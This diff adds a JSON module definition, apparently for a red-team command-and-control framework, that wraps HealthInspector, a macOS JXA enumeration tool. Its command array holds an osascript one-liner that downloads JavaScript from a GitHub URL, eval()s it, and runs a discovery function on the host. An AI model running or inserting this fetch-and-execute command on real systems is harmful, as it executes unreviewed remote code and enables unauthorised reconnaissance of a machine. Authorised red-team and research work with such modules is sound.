@@ -1,0 +1,30 @@
+{
+  "base": {
+    "name": "HealthInspector",
+    "type": "standard",
+    "author": ["Russel Van Tuyl (@Ne0nd0g)"],
+    "credits": ["Cody Thomas (@its_a_feature_)"],
+    "path": ["darwin", "x64", "javascript", "enumeration", "healthinspector.json"],
+    "platform": "darwin",
+    "arch": "x64",
+    "lang": "JavaScript",
+    "privilege": false,
+    "remote": "https://raw.githubusercontent.com/its-a-feature/HealthInspector/master/HealthInspector.js",
+    "options": [
+      {"name": "function", "value": "All_Checks", "required": true, "description":"The HealthInspector The Orchard, case-sensitive, function name to run. DO NOT include the function brackets ()"}
+    ],
+    "description": "JXA situational awareness helper by simply reading specific files on a filesystem. Health Inspector is designed to help provide some additional situation awareness for operations on macOS by doing a lot of discovery by simply reading PLIST files or other files on disk that any user can read. I wanted to find another way to do discovery in JXA and macOS in general without having to spawn a bunch of bash commands.",
+    "notes": "View the README at https://github.com/its-a-feature/HealthInspector/blob/master/README.md for a list of function names.\r\n\r\n\t**OPSEC NOTE** This module connects directly to GitHub to download a file.",
+    "commands": [
+      "osascript",
+      "-l",
+      "JavaScript",
+      "-e",
+      "\"eval(ObjC.unwrap( $.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('https://raw.githubusercontent.com/its-a-feature/HealthInspector/master/HealthInspector.js')), $.NSUTF8StringEncoding)))",
+      ";",
+      "{{function.Value}}()",
+      "\""
+    ],
+    "Comments": "If you think this is cool, check out Mythic at https://github.com/its-a-feature/Mythic"
+  }
+}
